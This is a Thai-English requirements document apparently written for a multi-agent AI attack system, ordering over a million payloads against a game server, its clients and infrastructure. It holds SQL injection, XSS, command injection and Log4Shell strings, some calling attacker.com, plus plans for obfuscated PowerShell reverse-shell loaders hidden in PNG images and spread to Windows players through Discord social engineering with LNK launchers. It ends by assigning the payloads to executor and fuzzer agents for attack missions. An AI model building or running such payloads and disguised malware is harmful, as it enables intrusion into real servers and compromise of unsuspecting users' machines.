# Payload Generation Requirements

> **Objective:** สร้างชุด Payloads จำนวนมากสำหรับใช้ในภารกิจโจมตีโดย Agent ของเรา เอกสารนี้ระบุข้อกำหนดสำหรับทีม Payload Generation

---

## 1. ภาพรวม (Overview)

- **Attacker:** `RebirthRC_AI_PT` (Multi-Agent System)
- **Target:** Game Server, Client, และ Infrastructure ที่เกี่ยวข้อง
- **Total Payloads Requested:** 1,000,000+ lines
- **Estimated Generation Time:** ~30 minutes

## 2. ประเภทของ Payload ที่ต้องการ

### 2.1. SQL Injection (SQLi)

- **เป้าหมาย:** Database หลังบ้าน (เช่น ระบบ Login, Item Shop, Leaderboard)
- **รูปแบบ:**
  - **In-band (Error-based):** `... OR 1=1 --`
  - **Blind (Time-based):** `... AND (SELECT SLEEP(5))`
  - **Out-of-band (DNS-based):** `... AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT UUID()), '.attacker.com\\a')))`
- **Encoding:** Plain text, URL-encoded
- **จำนวน:** 200,000 รายการ (คละรูปแบบ)

### 2.2. Cross-Site Scripting (XSS)

- **เป้าหมาย:** Web-based interfaces (เช่น Forum, Profile page, Clan page)
- **รูปแบบ:**
  - **Reflected:** `<script>alert('XSS')</script>`
  - **Stored:** `[img]onerror=alert('XSS')[/img]` (สำหรับ BBCode)
  - **DOM-based:** `#'<img src=x onerror=alert(1)>`
- **Encoding:** Plain text, HTML-encoded, URL-encoded
- **จำนวน:** 200,000 รายการ (คละรูปแบบและ event handlers)

### 2.3. Remote Code Execution (RCE) / Command Injection

- **เป้าหมาย:** Game Server, API Endpoints, Patch Server
- **รูปแบบ:**
  - **OS Command Injection:** `...; ls -la`, `... && whoami`
  - **Log4Shell (JNDI):** `${jndi:ldap://attacker.com/a}`
  - **Deserialization:** (Payloads สำหรับ Java, .NET, Python)
- **Encoding:** Plain text, Base64
- **จำนวน:** 200,000 รายการ (คละ OS และเทคนิค)

### 2.4. Fuzzing Payloads

- **เป้าหมาย:** Game Protocol Handlers
- **รูปแบบ:**
  - **Integer Overflow:** ค่าตัวเลขขนาดใหญ่ (e.g., `2^32-1`, `-1`)
  - **Buffer Overflow:** A's จำนวนมาก (`'A'*1024`)
  - **Format String:** `%s%s%s%n`
  - **Malformed Data:** โครงสร้าง Packet ที่ผิดเพี้ยน (เช่น Header ผิด, Length ไม่ตรง)
- **Encoding:** Hex, Raw bytes
- **จำนวน:** 300,000 รายการ (คละรูปแบบ)

### 2.5. Steganography / Polyglot Payloads (สำหรับ `steganography_playbook.md`)

- **เป้าหมาย:** Windows Client (ผ่าน Social Engineering บน Discord)
- **รูปแบบ:**
  1.  **PowerShell Loader (Reverse Shell):**
      - **Endpoint:** `tcp://[ATTACKER_C2_IP]:[PORT]` (ทีม C2 จะระบุ IP/Port)
      - **Obfuscation:** ใช้ `Invoke-Obfuscation` หรือเทคนิคที่คล้ายกัน
      - **Output:** Base64 encoded string
  2.  **Stego-Image:**
      - **Input:** PowerShell Loader (Base64) + ภาพ `.png` ต้นฉบับ
      - **Output:** ไฟล์ `.png` ที่ฝัง Payload
  3.  **LNK Activator:**
      - **Target:** `powershell.exe`
      - **Arguments:** Script ที่ใช้ดึงและรัน Payload จาก Pixel Data ของภาพ
- **จำนวน:**
  - **PowerShell Loaders:** 100,000 รูปแบบ (Obfuscated ต่างกัน)
  - **Stego-Images:** 1,000 ภาพ (จากภาพต้นฉบับ 100 ภาพ)

## 3. รูปแบบการส่งมอบ (Delivery Format)

- **ไฟล์:** `.txt` หรือ `.csv` แยกตามประเภทของ Payload
- **โครงสร้าง:** แต่ละบรรทัดคือ Payload หนึ่งรายการ
- **Metadata (ถ้ามี):** ระบุประเภท, รูปแบบ, และเป้าหมายที่แนะนำ

**ตัวอย่าง `sqli_payloads.txt`:**
```
' OR 1=1--
' OR '1'='1
... (และอื่นๆ)
```

---

> **แผนถัดไป:** หลังจากได้รับ Payloads ทั้งหมดแล้ว `Executor Agent` และ `Fuzzer Agent` จะถูกอัปเดตให้นำ Payloads เหล่านี้ไปใช้ในภารกิจโจมตีตามที่ `Planner Agent` สั่งการผ่าน MCP
